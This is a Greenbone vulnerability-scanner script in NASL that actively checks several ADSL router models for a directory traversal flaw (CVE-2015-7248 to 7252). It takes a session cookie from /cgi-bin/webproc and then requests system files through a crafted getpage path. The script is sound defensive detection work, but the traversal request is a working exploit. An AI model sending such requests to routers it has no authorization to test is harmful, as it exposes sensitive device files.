# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105242");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-03-23 10:41:22 +0100 (Mon, 23 Mar 2015)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-09-13 01:29:00 +0000 (Wed, 13 Sep 2017)");

  script_cve_id("CVE-2015-7252", "CVE-2015-7251", "CVE-2015-7250", "CVE-2015-7249",
                "CVE-2015-7248");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Multiple ADSL Routers Directory Traversal Vulnerability (Mar 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Multiple ADSL routers are prone to a directory traversal
  vulnerability because they fail to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"A remote attacker could exploit the vulnerability to access
  arbitrary files that contain sensitive information. Information harvested may aid in launching
  further attacks.");

  script_tag(name:"affected", value:"At least the following router models are vulnerable:

  - ZTE H108N, H108NV2.1

  - D-Link 2750E, 2730U, 2730E

  - Sitecom WLM-3600, WLR-6100, WLR-4100

  - FiberHome HG110

  - Planet ADN-4101

  - Digisol DG-BG4011N

  - Observa Telecom BHS_RTA_R1A");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://blog.norsecorp.com/2015/03/20/over-700000-adsl-routers-shipped-with-directory-traversal-vulnerability/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port( default:8080 );

url = "/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-";

req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "^HTTP/1\.[01] 200" && "set-cookie" >< tolower( buf ) && "sessionid" >< buf ) {
  files = traversal_files("linux");

  cookie = eregmatch( pattern:'set-cookie\\s*:\\s*sessionid=([^ ;]+)', string:buf, icase:TRUE );
  if( isnull( cookie[1] ) )
    exit( 0 );

  foreach pattern( keys( files ) ) {

    file = files[pattern];

    url = "/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/" + file;

    if( http_vuln_check( port:port, url:url, pattern:pattern, cookie:'sessionid=' + cookie[1] ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
